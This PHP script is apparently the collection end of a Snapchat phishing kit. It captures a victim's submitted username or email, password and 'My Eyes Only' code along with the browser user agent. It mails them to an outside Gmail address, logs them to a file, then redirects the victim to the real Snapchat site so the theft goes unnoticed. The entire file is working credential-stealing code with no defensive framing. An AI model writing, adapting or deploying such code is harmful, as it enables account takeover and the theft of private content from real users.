<?php
 
$message = "
📧  NOM D'UTILISATEUR OU ADRESSE E-MAIL : ".$_POST['username']."
🔒  MOT DE PASSE : ".$_POST['password']."
🔒  CODE MY EYES ONLY : ".$_POST['Eyes']."
🌐  Plateforme : ".$_SERVER["HTTP_USER_AGENT"]."
";
$Subject="👻 Log snap ".$_POST['username']." ✨";
$head="From: λbeloth 🖤  <login>";
mail("abelothigohq@gmail.com",$Subject,$message,$head);
$fil = fopen('logs.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_one']  = true;
header('Location:https://www.snapchat.com/'); ?>